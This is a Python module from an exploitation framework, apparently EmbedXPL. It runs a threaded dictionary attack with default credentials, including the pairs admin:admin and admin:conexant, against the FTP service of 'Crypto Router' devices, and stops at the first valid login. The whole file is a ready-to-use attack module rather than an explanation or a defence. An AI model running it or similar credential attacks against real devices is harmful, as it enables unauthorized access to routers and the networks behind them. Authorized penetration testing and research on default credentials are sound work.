# Author: André Henrique (LinkedIn/X: @mrhenrike)
from embedxpl.core.exploit import *
from embedxpl.modules.creds.generic.ftp_default import Exploit as FTPDefault


class Exploit(FTPDefault):
    __info__ = {
        "name": "Crypto Router Default FTP Creds",
        "description": "Dictionary attack with default credentials against Crypto Router FTP service.",
        "authors": ("André Henrique (@mrhenrike) — EmbedXPL-Forge",),
        "devices": ("Crypto Router",),
    }
    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist("admin:admin,admin:conexant", "User:Pass or file with default credentials (file://)")
    stop_on_success = OptBool(True, "Stop on first valid attempt")
    verbosity = OptBool(True, "Display attempts")
